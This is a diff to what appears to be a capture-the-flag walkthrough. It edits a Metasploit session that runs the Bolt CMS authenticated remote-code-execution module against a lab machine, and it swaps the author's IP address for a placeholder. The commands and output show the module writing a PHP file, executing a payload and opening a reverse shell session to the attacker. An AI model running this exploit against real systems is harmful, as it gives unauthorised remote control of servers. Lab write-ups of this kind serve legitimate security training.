@@ -119,9 +119,9 @@ You know the username and password. LHOST is your IP that you can find it on htt
 
 Make sure everything is correct before running ```exploit```/```run```
 ```
-msf6 > use 28
-msf6 exploit(unix/webapp/bolt_authenticated_rce) > set lhost 10.8.33.214
-lhost => 10.8.33.214
+msf6 > exploit/unix/webapp/bolt_authenticated_rce
+msf6 exploit(unix/webapp/bolt_authenticated_rce) > set lhost <YourIP>
+lhost => <YourIP>
 msf6 exploit(unix/webapp/bolt_authenticated_rce) > set rhosts 10.10.189.109
 rhosts => 10.10.189.109
 msf6 exploit(unix/webapp/bolt_authenticated_rce) > set username b...
@@ -134,13 +134,13 @@ password => b...........
 ```
 msf6 exploit(unix/webapp/bolt_authenticated_rce) > run
 
-[*] Started reverse TCP handler on 10.8.33.214:1234 
+[*] Started reverse TCP handler on <YourIP>:4444 
 [*] Executing automatic check (disable AutoCheck to override)
 [+] The target is vulnerable. Successfully changed the /bolt/profile username to PHP $_GET variable "biczvo".
 [*] Found 2 potential token(s) for creating .php files.
 [+] Used token 886cf3be6cb404b04c371dd3b6 to create jjgvqcgyaxm.php.
 [*] Attempting to execute the payload via "/files/jjgvqcgyaxm.php?biczvo=`payload`"
-[*] Command shell session 1 opened (10.8.33.214:1234 -> 10.10.189.109:60300) at 2020-08-23 03:41:42 +0100
+[*] Command shell session 1 opened (<YourIP>:4444 -> 10.10.189.109:60300) at 2020-08-23 03:41:42 +0100
 [!] No response, may have executed a blocking payload!
 [+] Deleted file jjgvqcgyaxm.php.
 [+] Reverted user profile back to original state.
